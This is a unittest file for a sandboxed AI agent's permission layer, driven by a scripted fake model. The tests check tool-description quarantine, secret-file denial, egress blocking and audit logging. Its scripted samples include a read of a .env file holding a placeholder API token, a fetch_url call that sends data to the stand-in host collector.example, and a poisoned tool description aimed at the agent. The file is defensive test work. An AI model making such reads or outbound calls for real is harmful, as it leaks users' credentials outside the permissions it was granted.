"""The secure agent end to end, with a scripted model. Run: python -m unittest -v test_secure_agent"""

import json
import tempfile
import unittest
from pathlib import Path

from secure_agent import SecureAgent, schema_errors  # first: puts Stages 1-2 on the import path
from client import ToolClient
from llm import FakeProvider, ToolResults, tool_call
from policy import Manifest
from tools import Workspace

HERE = Path(__file__).resolve().parent


class Base(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        base = Path(self._tmp.name)
        self.root = base / "ws"
        self.root.mkdir()
        (self.root / "README.md").write_text("project readme")
        (self.root / ".env").write_text("API_TOKEN=sk-live-123")
        self.egress = base / "egress.log"
        self.audit = base / "audit.jsonl"
        self.manifest = Manifest.load(HERE / "manifests" / "code-reviewer.toml")
        self.clients = []

    def tearDown(self):
        for c in self.clients:
            c.close()
        self._tmp.cleanup()

    def agent(self, script, approver=None, poisoned=False):
        client = ToolClient(self.root, self.egress, poisoned=poisoned)
        self.clients.append(client)
        self.model = FakeProvider(script)
        return SecureAgent(self.model, Workspace(self.root), self.manifest, client,
                           approver=approver, audit_log=self.audit)

    def result_at(self, step, i=0):
        last = self.model.histories[step - 1][-1]
        self.assertIsInstance(last, ToolResults)
        return last.results[i]

    def egressed(self):
        return self.egress.read_text().splitlines() if self.egress.exists() else []


class Advertising(Base):
    def test_only_granted_pinned_tools_are_shown(self):
        a = self.agent(["done"])
        self.assertEqual({s.name for s in a.specs}, {"read_file", "list_dir", "search", "fetch_url"})

    def test_changed_description_is_quarantined(self):
        a = self.agent(["done"], poisoned=True)
        self.assertIn("read_file", a.quarantined)
        self.assertNotIn("read_file", {s.name for s in a.specs})
        for s in a.specs:                               # the injected text never reaches the model
            self.assertNotIn(".env", s.description)


class Decisions(Base):
    def test_granted_read(self):
        self.agent([tool_call("read_file", path="README.md"), "done"]).run("x")
        self.assertEqual(self.result_at(2).content, "project readme")

    def test_secret_read_denied_before_the_tool_process_sees_it(self):
        self.agent([tool_call("read_file", path=".env"), "done"]).run("x")
        r = self.result_at(2)
        self.assertTrue(r.content.startswith("denied"))
        self.assertNotIn("sk-live", r.content)

    def test_egress_to_unlisted_host_denied(self):
        self.agent([tool_call("fetch_url", url="https://collector.example/?k=1"), "done"]).run("x")
        self.assertIn("not permitted", self.result_at(2).content)
        self.assertEqual(self.egressed(), [])

    def test_ask_without_approver_is_deny(self):
        self.agent([tool_call("fetch_url", url="https://docs.python.org/3/"), "done"]).run("x")
        self.assertIn("approval not granted", self.result_at(2).content)
        self.assertEqual(self.egressed(), [])

    def test_approver_sees_the_exact_request(self):
        seen = []
        approver = lambda call, reason: seen.append((call.name, call.arguments)) or True
        self.agent([tool_call("fetch_url", url="https://docs.python.org/3/"), "done"], approver).run("x")
        self.assertEqual(seen, [("fetch_url", {"url": "https://docs.python.org/3/"})])
        self.assertEqual(self.egressed(), ["https://docs.python.org/3/"])

    def test_every_decision_is_audited(self):
        self.agent([[tool_call("read_file", path="README.md"), tool_call("read_file", path=".env"),
                     tool_call("write_file", path="x", content="y")], "done"]).run("x")
        verdicts = [json.loads(l)["verdict"] for l in self.audit.read_text().splitlines()]
        self.assertEqual(verdicts, ["allow", "deny", "deny"])

    def test_schema_validation(self):
        schema = {"type": "object", "properties": {"path": {"type": "string"}},
                  "required": ["path"], "additionalProperties": False}
        self.assertEqual(schema_errors({"path": "a"}, schema), [])
        self.assertEqual(schema_errors({}, schema), ["path: required"])
        self.assertEqual(schema_errors({"path": 3}, schema), ["path: expected string"])
        self.assertEqual(schema_errors({"path": "a", "cmd": "rm"}, schema), ["cmd: not a parameter of this tool"])


if __name__ == "__main__":
    unittest.main()
